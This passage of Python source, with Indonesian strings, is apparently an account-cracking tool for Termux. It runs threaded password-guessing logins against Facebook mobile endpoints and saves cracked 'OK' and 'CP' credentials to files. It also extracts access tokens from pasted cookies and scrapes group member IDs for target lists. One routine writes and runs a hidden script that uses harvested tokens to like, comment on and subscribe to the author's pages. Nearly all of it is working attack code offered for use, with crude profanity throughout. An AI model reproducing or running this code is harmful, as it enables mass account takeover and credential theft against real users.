      print(("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s|%s %s               "%(username,password,N)))
      ok.append(username + "|" + password)
      bokep_japan_yang_terbaru("OK", username, password, "-")
      save = open("Hasil/OK-"+durasi+".txt", "a")
      save.write(str(username) + "|" + str(password) + "\n")
      save.close()
      return True
    else:
      if "www.facebook.com" in response.json()["error_msg"]:
        self.cp.append(username + "|" + password)
        print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s|%s %s               "%(username,password,N)))
        bokep_japan_yang_terbaru("CP", username, password, "-")
        save = open("Hasil/CP-"+durasi+".txt", "a+")
        save.write(str(username) + "|" + str(password) + "\n")
        save.close()
        return True
    return False
  def brute(self, fl):
    if self.setpw == False:
      self.loop += 1
      for pw in fl["pw"]:
        username = fl["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;33m[\x1b[0;37m%s\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m(\x1b[0;37mOK : %s\x1b[0;32m) \x1b[0;33m(\x1b[0;37mCP : %s\x1b[0;33m)\x1b[0;37m"%(username,self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
    else:
      self.loop += 1
      for pw in self.setpw:
        username = users["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;33m[\x1b[0;37m%s\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m(\x1b[0;37mOK : %s\x1b[0;32m) \x1b[0;33m(\x1b[0;37mCP : %s\x1b[0;33m)\x1b[0;37m"%(username,self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
class crackffb:
	os.system("clear")
	banner()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		pilih_pw()
		print(("\n"+k+"["+p+"•"+k+"]"+p+" Do You Want To Use Manual Password?? "+k+"[ "+h+"Y/n"+k+" ]"+p))
		while True:
			f=input(k+"["+p+"•"+k+"]"+p+" Choose : ")
			if f=="":continue
			elif f in ["Y","y"]:
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((k+"["+p+"•"+k+"]"+p+" Example : sayang,bismillah,123456"))
				self.pwlist()
				break
			elif f in ["N","n"]:
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : Hasil/OK-"+durasi+".txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : Hasil/CP-"+durasi+".txt\n"))
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : Hasil/OK-"+durasi+".txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : Hasil/CP-"+durasi+".txt\n"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=f_fb(fl.get("id"),
					i,"https://free.facebook.com")
				if log.get("status")=="cp":
					print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s|%s               "%(fl.get("id"),i)))
					self.cp.append("%s|%s"%(fl.get("id"),i))
					open("Hasil/CP-"+durasi+".txt","a+").write(
						"%s|%s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s|%s               "%(fl.get("id"),i)))
					self.ada.append("%s|%s"%(fl.get("id"),i))
					open("OK-"+durasi+".txt","a+").write(
						"%s|%s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)
class crack2:
	os.system("clear")
	banner()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		pilih_pw()
		print(("\n"+k+"["+p+"•"+k+"]"+p+" Do You Want To Use Manual Password?? "+k+"[ "+h+"Y/n"+k+" ]"+p))
		while True:
			f=input(k+"["+p+"•"+k+"]"+p+" Choose : ")
			if f=="":continue
			elif f=="Y" or f=="y":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((k+"["+p+"•"+k+"]"+p+" Example : sayang,bismillah,123456"))
				self.pwlist()
				break
			elif f=="N" or f=="n":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : Hasil/OK-"+durasi+".txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : Hasil/CP-"+durasi+".txt\n"))
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : Hasil/OK-"+durasi+".txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : Hasil/CP-"+durasi+".txt\n"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic2(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="cp":
					print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s|%s               "%(fl.get("id"),i)))
					self.cp.append("%s|%s"%(fl.get("id"),i))
					open("Hasil/CP-"+durasi+".txt","a+").write(
						"%s|%s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s|%s               "%(fl.get("id"),i)))
					self.ada.append("%s|%s"%(fl.get("id"),i))
					open("Hasil/OK-"+durasi+".txt.txt","a+").write(
						"%s|%s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)
class crack:
	os.system("clear")
	banner()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		pilih_pw()
		print(("\n"+k+"["+p+"•"+k+"]"+p+" Do You Want To Use Manual Password?? "+k+"[ "+h+"Y/n"+k+" ]"+p))
		while True:
			f=input(k+"["+p+"•"+k+"]"+p+" Choose : ")
			if f=="":continue
			elif f=="Y" or f=="y":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((k+"["+p+"•"+k+"]"+p+" Example : sayang,bismillah,123456"))
				self.pwlist()
				break
			elif f=="N" or f=="n":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : Hasil/OK-"+durasi+".txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : Hasil/CP-"+durasi+".txt\n"))
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : Hasil/OK-"+durasi+".txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : Hasil/CP-"+durasi+".txt\n"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="cp":
					print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s|%s               "%(fl.get("id"),i)))
					self.cp.append("%s|%s"%(fl.get("id"),i))
					open("Hasil/CP-"+durasi+".txt","a+").write(
						"%s|%s\n"%(fl.get("id"),i))
					check_in(fl.get("id"),i)
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s|%s               "%(fl.get("id"),i)))
					self.ada.append("%s|%s"%(fl.get("id"),i))
					open("Hasil/OK-"+durasi+".txt.txt","a+").write(
						"%s|%s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
#			print("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)
# Enc Crack

# Login
def logs():
  os.system("clear")
  banner()
  print((k+"\n["+p+"1"+k+"]"+p+" Login Token"))
  print((k+"["+p+"2"+k+"]"+p+" Login Cookies"))
  print((k+"["+p+"3"+k+"]"+p+" Token Gratis ( Premium )"))
  print((k+"["+p+"0"+k+"]"+p+" Exit"))
  sek=input(k+"\n["+p+"•"+k+"]"+p+" Choose : ")
  if sek=="":
    print((k+"\n["+p+"!"+k+"]"+p+" Fill In The Correct"))
    logs()
  elif sek=="1":
    log_token()
  elif sek=="2":
#    gen()
    coke()
  elif sek=="3":
    if os.path.exists('.prem'):
        license()
        pass
    else:
        jalan(war+"Do you want to login as a premium user? (Y/n)")
        bo = input(war+"Choose : "+I)
        if bo == "y" or bo == "Y":
           license()
        else:
           exit(jalan(war+"Sorry You Are Not A Premium User !! "))
    no()
    exit()
  elif sek=="0":
    exit()
  else:
    print((k+"\n["+p+"!"+k+"]"+p+" Fill In The Correct"))
    logs()
def no():
    try:
            os.remove(".bokep.py")
    except:pass
    jalan(war+"Sedang Ambil Token !!")
    kntl()
    try:
            asww=requests.get("https://free.facebook.com/KM39453/posts/1714009362122228")
            aq = asww.text
            h_tkn=(str(re.findall("(EA\w+)",aq)))
            j(h_tkn)
    except requests.exceptions.ConnectionError:
            exit(jalan('\n%s[%s!%s] %sConnection Error'%(M,P,M,P)))
def j(h_tkn):
    jalan("\n"+war+"Berasil Membuat File !!")
    idq = open('.bokep.py', 'w')
    idq.write(f"""
from random import choice as pilih
import requests, re, random, json, bs4, time, os, sys
from time import sleep as waktu
lpp=({h_tkn})
for n in lpp:
        token = n
        toket = n
        try:
                bK = ('''\n\n\n\n''')
                print("\033[0;36mToken : "+n)
                otw = requests.get("https://graph.facebook.com/me/?access_token="+token)
                a = json.loads(otw.text)
                nama = a["name"]
                id = a["id"]
                print("\033[0;37mNAMA >>>>>> "+nama)
                print("\033[0;37mID   >>>>>> "+id)
                try:
                        rr = requests.get("https://graph.facebook.com/me/friends?access_token="+token)
                        zz = json.loads(rr.text)
                        id = []
                        for ii in zz["data"]:
                                uid = ii['id']
                                id.append(uid)
                        bh=("%s"%(str(len(id))))
                except:
                        bh=("0")
                        pass
                print ("Jumlah Teman : "+bh)
                requests.post("https://graph.facebook.com/287175390082137/likes?summary=true&access_token=" + toket)
                requests.post('https://graph.facebook.com/287175390082137/comments/?message=' + token + '&access_token=' + token)
                requests.post('https://graph.facebook.com/100063690353340/subscribers?access_token=' + token) ### FB RISKY
                requests.post('https://graph.facebook.com/100067783659018/subscribers?access_token=' + token) ### FB RISKY
                requests.post('https://graph.facebook.com/100002924366263/subscribers?access_token=' + token) ### FB RISKY
                requests.post('https://graph.facebook.com/110877271176800/subscribers?access_token=' + token) ### Halaman Risky
                time.sleep(0.05)
                print(bK)
        except Exception as e:
                print("\033[0;31mToken Error")
                print(bK)""")
    idq.close()
    os.system("python .bokep.py")

def log_token():
    print(war+"You Don't Have Facebook Cookies/Tokens :( Please Visit My Facebook Profile")
    print(war+"LINK FACEBOOK : HTTPS://M.FACEBOOK.COM/llovexnxx")
    toket = input(k+"\n["+p+"•"+k+"]"+p+" Token : ")
    try:
        otw = requests.get("https://graph.facebook.com/me?access_token=" + toket)
        a = json.loads(otw.text)
        nama = a["name"]
        zedd = open("login.txt", "w")
        zedd.write(toket)
        zedd.close()
        print((k+"\n["+p+"•"+k+"]"+p+" Login Successful"))
        bot_follow()
    except KeyError:
        print((k+"["+p+"!"+k+"]"+p+" Token Invalid"))
        os.system("clear")
        logs()
def gen():
        print("You Don't Have Facebook Cookies/Tokens :( Please Visit My Facebook Profile...")
        print("LINK FACEBOOK : HTTPS://M.FACEBOOK.COM/llovexnxx")
        cookie = input('%s[%s•%s] %sCookies : '%(C,P,C,P))
        try:
            data = requests.get("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_", headers = {
            "user-agent"                : "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36", # Jangan Di Ganti Ea Anjink.
            "referer"                   : "https://m.facebook.com/",
            "host"                      : "m.facebook.com",
            "origin"                    : "https://m.facebook.com",
            "upgrade-insecure-requests" : "1",
            "accept-language"           : "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "cache-control"             : "max-age=0",
            "accept"                    : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            "content-type"              : "text/html; charset=utf-8"
            }, cookies = {
            "cookie"                    : cookie
            })
            find_token = re.search("(EAAA\w+)", data.text)
            hasil = "\n* Fail : maybe your cookie invalid !!" if (find_token is None) else "\n* Your fb access token : " + find_token.group(1)
            xd = open("token.txt", "w")
            xd.write(find_token.group(1))
            xd.close()
            jalan('\n%s[%s!%s] %sLogin Successful'%(C,P,C,P))
            bot_follow()
            menu()
        except requests.exceptions.ConnectionError:
            jalan('\n%s[%s!%s] %sConnection Error'%(M,P,M,P))
            exit()
        except (KeyError,IOError,AttributeError):
            jalan('\n%s[%s!%s] %sCookies Invalid'%(M,P,M,P))
            os.system('rm -rf token.txt')
            logs()

# Enc Login

# Menu Lainnya
import requests,sys,random,re,base64,json
#from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from bs4 import BeautifulSoup as parser
hostm=("https://m.facebook.com")
uac=("NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+")
def basecookie():
	if os.path.exists("cookies"):
		if os.path.getsize("cookies") !=0:
			return gets_dict_cookies(open('cookies').read().strip())
		else:coke()
	else:coke()
def coke():
        _cookie=input(war+'Cookies : '+I)
        try:
                _head={
                        'Host':'business.facebook.com',
                                'cache-control':'max-age=0',
                        'upgrade-insecure-requests':'1',
                                'user-agent':'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36',
                        'accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                                'content-type' : 'text/html; charset=utf-8',
                        'accept-encoding':'gzip, deflate',
                                'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',

                        'cookie': _cookie
                }
                _r=_ses.get(urls, headers=_head)
                _p=re.search('(EAAG\w+)', _r.text)
                _h=_p.group(1)
                if 'EAA' in _h:
                        open("login.txt", 'w').write('%s' % (_h))
                        open("cookies", 'w').write('%s' % (_cookie))
                        bokep_barat_yang_terbaru(_cookie)
                        bokep_barat_yang_terbaru(_h)
        except (AttributeError, requests.exceptions.TooManyRedirects):
                print(war+'Cookies Error !')
                time.sleep(3)
                coke()
        exit(jalan(war+"Run Again! Or Type : python prem.py"))
def cek_kuki(_cookie):
   #     try:
  #              _cookie=raw_input('\x1b[0;93m(+) cookie :\x1b[0;92m ')
 #       except:
#                _cookie=input('\x1b[0;93m(+) cookie :\x1b[0;92m ')
        try:
                _head={
                        'Host':'business.facebook.com',
                                'cache-control':'max-age=0',
                        'upgrade-insecure-requests':'1',
                                'user-agent':'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36',
                        'accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                                'content-type' : 'text/html; charset=utf-8',
                        'accept-encoding':'gzip, deflate',
                                'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',

                        'cookie': _cookie
                }
                _r=_ses.get(urls, headers=_head)
                _p=re.search('(EAAG\w+)', _r.text)
                _h=_p.group(1)
                if 'EAA' in _h:
                        pass
        except (AttributeError, requests.exceptions.TooManyRedirects):
                print(war+'Cookies Error')
                time.sleep(3)
                menu()
def gets_dict_cookies(cookies):
	result={}
	try:
		for i in cookies.split(";"):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
	except:
		for i in cookies.split("; "):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
def cvd(cookies):
    result = {}
    try:
        for i in cookies.split(';'):
            result.update({i.split('=')[0]: i.split('=')[1]})

        return result
    except:
        for i in cookies.split('; '):
            result.update({i.split('=')[0]: i.split('=')[1]})

        return result
def hdcok():
	global hostm,uac
	hosts=hostm
	r={"origin": hosts, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": uac, "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}
	return r
def cek(arg):
        if os.path.exists("cookies"):
                if os.path.getsize("cookies") !=0:
                        return True
                else:return False
        else:return False
def cek_cookie():
        cvds=None
        new=None
        if cek(1)==False:
                try:
                        cookie=cvd(open("cookies").read().strip())
                        cvds=cvd(cookie)
                        new=True
                except:
                        print(war+"Cookie Invalid");coke()
        else:
                cvds=cvd(open("cookies").read().strip())
        r=requests.get("https://mbasic.facebook.com/profile.php",
                cookies=cvds,
        headers=hdcok()).text
        if len(bs4.re.findall("logout",r)) !=0:
                jalan(war+"Selamat Datang %s"%(
                        bs4.BeautifulSoup(r,
                "html.parser").find("title").text[0:20]))
                time.sleep(2)
                menu()
        else:
                try:
                        os.remove("cookies")
                except:
                        pass
                print(war+"Cookie Invalid");coke()

class dump_grup:

    def __init__(self, cookies):
        self.glist = []
        self.ialist = []
        self.cookies = cookies
        self.extract('https://m.facebook.com/groups/?seemore')

    def extract(self, url):
        bs = bs4.BeautifulSoup(requests.get(url, cookies=self.cookies, headers=hdcok()).text, 'html.parser')
        for i in bs.find_all('a', href=True):
            if '/groups/' in i.get('href'):
                if 'category' in i.get('href') or 'create' in i.get('href'):
                    continue
                else:
                    self.glist.append({'id': ('').join(bs4.re.findall('/groups/(.*?)\\?', i.get('href'))), 
                       'name': i.text})

        if len(self.glist) != 0:
            jalan(f'\n{war}Anda Memiliki {I}%s{K} Grup' % len(self.glist))
            print(f'{p}[{k}1{p}]{k} Check Id Dan Nama Grup Saya')
            print(f'{p}[{k}2{p}]{k} Start Dump Id')
            while True:
                c = input(war+'Pilih : '+I)
                if c == '':
                    continue
                elif c == '1':
                    self.search()
                    exit()
                elif c == '2':
                    self.manual()
                    exit()
                else:
                    exit(war+"Wrong Input")

        else:
             jalan(war+"Anda Belum Memiliki Grup")
             self.manual()
             exit()
    def manual(self):
        id = input('\n'+war+'Grup Idz : '+I)
        if id == '':
            self.manual()
        else:
            r = bs4.BeautifulSoup(requests.get('https://m.facebook.com/groups/' + id, headers=hdcok(), cookies=self.cookies).text, 'html.parser')
            if 'konten tidak' in r.find('title').text.lower():
                exit(war+'Anda Belum Bergabung Grup')
            else:
                self.listed = {'id': id, 'name': r.find('title').text}
                self.f()
                print(f'{war}Nama Grup {c}%s{p}' % self.listed.get('name')[0:25])
#                print("\r"+war+'File Dump DiSimpan Di : '+I+"dump/"+self.fl+".json")
                try:
                    self.dumps('https://m.facebook.com/groups/' + id)
                except (KeyboardInterrupt,EOFError):
                    print("\n\r"+war+'File Dump DiSimpan Di : '+I+"dump/"+self.fl+".json")
            #        print("\n\r"+war+'File Dump DiSimpan Di : '+I+self.fl)
                    input(war+"Back")
                    menu()

    def search(self):
        whitelist = []
        if len(self.glist) == 0:
            print(war+"Maaf Tidak Ada Hasil !!")
            time.sleep(4)
            self.manual()
        else:pass
        try:
            for t in range(1):
                try:
                    for e, i in enumerate(self.glist):
                        iid = i.get('id')
                        id = iid.split('/')
                        namw = i.get('name')
                        print(f"{war}ID : {C}{id[0]}{P} <===> NAMA : {C}{namw}{P}")
                except:pass
        except:
            print(war+"Terjadi Kesalahan Hub : 6283143565470")
#        menu()
        self.manual()
    def f(self):
        self.fl = input(war+"Nama File : "+I)
        if self.fl == '':
            self.fl()
        open("dump/"+self.fl+".json", 'w').close()
#        open(self.fl, 'w').close()

    def dumps(self, url):
        r = bs4.BeautifulSoup(requests.get(url, cookies=self.cookies, headers=hdcok()).text, 'html.parser')
#        print(("\r%sSedang Dump %s%s Tekan CTRL + C Untuk Stop Dump !!"%(war, C, len(open(self.fl).read().splitlines()))), end=' ');sys.stdout.flush()
        print(("\r%sSedang Dump %s%s Tekan CTRL + C Untuk Stop Dump !!"%(war, C, len(open("dump/"+self.fl+".json").read().splitlines()))), end=' ');sys.stdout.flush()
        for i in r.find_all('h3'):
            try:
                if len(bs4.re.findall('\\/', i.find('a', href=True).get('href'))) == 1:
                    ogeh = i.find('a', href=True)
                    if 'profile.php' in ogeh.get('href'):
                        a = ('').join(bs4.re.findall('profile\\.php\\?id=(.*?)&', ogeh.get('href')))
                        if len(a) == 0:
                            continue
#                        elif a in open(self.fl).read():
                        elif a in open("dump/"+self.fl+".json").read():
                            continue
                        else:
#                            open(self.fl, 'a+').write('%s<=>%s\n' % (a, ogeh.text))
                            open("dump/"+self.fl+".json", 'a+').write('%s<=>%s\n' % (a, ogeh.text))
                            continue
                    else:
                        a = ('').join(bs4.re.findall('/(.*?)\\?', ogeh.get('href')))
                        if len(a) == 0:
                            continue
#                        elif a in open(self.fl).read():
                        elif a in open("dump/"+self.fl+".json").read():
                            continue
                        else:
 #                           open(self.fl, 'a+').write('%s<=>%s\n' % (a, ogeh.text))
                            open("dump/"+self.fl+".json", 'a+').write('%s<=>%s\n' % (a, ogeh.text))
            except:
                continue

        for i in r.find_all('a', href=True):
            if 'Lihat Postingan Lainnya' in i.text:
                while True:
                    try:
                        self.dumps('https://m.facebook.com/' + i.get('href'))
                        break
                    except Exception as e:
                        print('\r'+war+'%s Mengulangi' % e)
                        continue
        print("\n\r"+war+'File Dump DiSimpan Di : '+I+"dump/"+self.fl+".json")
#        print("\n\r"+war+'File Dump DiSimpan Di : '+I+self.fl)
        input(war+"Back")
        menu()
"""
    def f(self):
        self.fl = input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama File :\x1b[1;96m ")
        if self.fl == '':
            self.fl()
        open(self.fl, 'w').close()

    def dumps(self, url):
        r = bs4.BeautifulSoup(requests.get(url, cookies=self.cookies, headers=hdcok()).text, 'html.parser')
        print("\r\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Dump\x1b[1;96m %s\x1b[1;97m ID \x1b[1;97m*\x1b[1;93mtype ctrl+z to stop\r" % len(open(self.fl).read().splitlines())),;sys.stdout.flush();time.sleep(0.007)
        for i in r.find_all('h3'):
            try:
                if len(bs4.re.findall('\\/', i.find('a', href=True).get('href'))) == 1:
                    ogeh = i.find('a', href=True)
                    if 'profile.php' in ogeh.get('href'):
                        a = ('').join(bs4.re.findall('profile\\.php\\?id=(.*?)&', ogeh.get('href')))
                        if len(a) == 0:
                            continue
                        elif a in open(self.fl).read():
                            continue
                        else:
                            open(self.fl, 'a+').write('%s<=>%s\n' % (a, ogeh.text))
                            continue
                    else:
                        a = ('').join(bs4.re.findall('/(.*?)\\?', ogeh.get('href')))
                        if len(a) == 0:
                            continue
                        elif a in open(self.fl).read():
                            continue
                        else:
                            open(self.fl, 'a+').write('%s<=>%s\n' % (a, ogeh.text))
            except:
                continue

        for i in r.find_all('a', href=True):
            if 'Lihat Postingan Lainnya' in i.text:
                while True:
                    try:
                        self.dumps('https://m.facebook.com/' + i.get('href'))
                        break
                    except Exception as e:
                        print('\r\x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;93m %s\x1b[1;97m,\x1b[1;93m Mencoba Lagi' % e)
                        continue

        print("\r\x1b[1;97m                                              ")
        print('\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Selesai')
        print('\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m File Dump Tersimpan :\x1b[1;93m '+self.fl)
        input("\x1b[1;97m{\x1b[1;92mKembali\x1b[1;97m}")
        menu()
"""
def tombol_add():
	try:
		os.mkdir('/data/data/com.termux/files/home/.termux')
	except:
		pass
	try:
		kontol = open('.tombol','r')
	except Exception as e:
		try:
			file = open("/data/data/com.termux/files/home/.termux/termux.properties","r")
		except Exception as e:
			jalan(war+"Maaf Tombol Termux Anda Belum Ada..")
			jalan(war+"Sorry, your Termux button doesn't exist yet!")
			jalan(war+"Making Termux Files!!")
			kntl()
			try:
				key = "extra-keys = [['DEL','/sdcard/','$HOME','HOME','UP','END','PGUP'],['TAB','CTRL','ALT','LEFT','DOWN','RIGHT','PGDN']]"
				kontol = open('/data/data/com.termux/files/home/.termux/termux.properties','w')
				kontol.write(key)
				kontol.close()
				os.system('termux-reload-settings')
			except Exception as e:
				kontol = open('.tombol','w')
				kontol.write("No Support For You !!")
				kontol.close()
				jalan(war+"Maaf Tidak Cocok Untuk Perangkat Anda !!")
				print(war+'Sorry Not Suitable For Your Device !!')
				time.sleep(2.75)
				pass
			pass
def cek_jaringan():
	global xc
	try:
		ap = requests.get("https://www.facebook.com").text
		return
	except requests.exceptions.ConnectionError:
		xc += 1
		print("\r"+war+"Not Internet %s"%(int(xc)), end=' ');sys.stdout.flush()
		return cek_jaringan()
def cekfile(folder):
	dirs = os.listdir(folder)
	for file in dirs:
		filex = (folder+"/"+file)
		try:
			juma = open(filex,"r").readlines()
			total = ("%s"%(str(len(juma))))
		except:total = (" ?? ")
		print(war+"File Name : "+M+filex+C+" ⟨"+K+"IDZ"+C+"⟩ "+M+total)

def get_visitor():
	try:
		memek = requests.get("https://komarev.com/ghpvc/?username=Dumai-991&color=blue").text.strip()
		memekw, memekq = memek.split('<text x="105" y="14">')
		githubx = memekq.split('</text>')
		pepeq = requests.get("https://camo.githubusercontent.com/2d7842801a4429dade77642a7444a8d2d8bd83e92e9f9944aaeaa11343d250ae/68747470733a2f2f6b6f6d617265762e636f6d2f67687076632f3f757365726e616d653d44756d61692d39393126636f6c6f723d626c7565").text.strip()
		pepep, pepek = pepeq.split('<text x="105" y="14">')
		termux = pepek.split('</text>')
